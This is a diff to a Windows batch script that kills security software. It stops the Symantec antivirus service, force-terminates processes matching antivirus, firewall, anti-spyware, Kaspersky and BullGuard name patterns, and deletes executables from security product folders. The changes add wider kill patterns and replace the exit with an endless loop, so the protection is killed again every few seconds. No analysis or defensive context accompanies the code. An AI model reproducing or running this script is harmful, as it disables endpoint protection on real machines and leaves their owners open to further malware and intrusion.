@@ -1,8 +1,11 @@
 @echo off
+:loop
 net stop "symantec antivirus"
 taskkill /f /FI "MEMUSAGE gt 5" /IM av*
-taskkill /f /FI "MEMUSAGE gt 5" /FI "MEMUSAGE gt 5" /IM fire*
+taskkill /f /FI "MEMUSAGE gt 5" /IM fire*
 taskkill /f /FI "MEMUSAGE gt 5" /IM anti*
+taskkill /f /FI "MEMUSAGE gt 5" /IM *anti*
+taskkill /f /FI "MEMUSAGE gt 5" /IM *kaspersky*
 cls
 taskkill /f /FI "MEMUSAGE gt 5" /IM spy*
 taskkill /f /FI "MEMUSAGE gt 5" /IM bullguard
@@ -120,4 +123,5 @@ cls
 del /Q /F %programfiles%\apvxdwin\*.exe
 del /Q /F %programfiles%\webproxy\*.exe
 del /Q /F %programfiles%\pandasoftware\*.*
-exit
+timeout /t 3 /nobreak
+goto :loop
